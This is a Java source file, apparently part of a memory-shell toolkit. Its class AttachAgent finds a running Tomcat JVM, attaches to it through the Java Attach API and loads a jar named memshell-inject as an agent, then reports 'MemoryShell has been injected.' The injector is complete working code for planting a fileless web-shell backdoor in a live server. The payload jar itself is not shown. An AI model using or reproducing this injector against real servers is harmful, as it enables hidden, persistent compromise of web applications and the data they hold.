package org.su18.memshell.inject;


import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.List;

/**
 * agent 注入进程
 *
 * @author su18
 */
public class AttachAgent {

	/**
	 * 用来注入的 main 方法
	 *
	 * @param args 参数
	 * @throws Exception 异常
	 */
	public static void main(String[] args) throws Exception {

		VirtualMachine                 vm;
		List<VirtualMachineDescriptor> vmList;

		String currentPath = AttachAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath();
		currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
		String agentFile = new File(currentPath + "../memshell-inject-1.0.0.jar").getCanonicalPath();

		// 循环 JVM 进程，查找有 catalina 关键字的虚拟机
		try {
			vmList = VirtualMachine.list();
			for (VirtualMachineDescriptor vmd : vmList) {
				if (vmd.displayName().contains("catalina") || "".equals(vmd.displayName())) {
					vm = VirtualMachine.attach(vmd);

					// 兼容 windows 上的 Tomcat Service
					if ("".equals(vmd.displayName()) && !vm.getSystemProperties().containsKey("catalina.home")) {
						continue;
					}

					if (null != vm) {
						vm.loadAgent(agentFile);
						System.out.println("MemoryShell has been injected.");
						vm.detach();
						return;
					}
				}
			}

			System.out.println("No Tomcat Virtual Machine found.");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


}
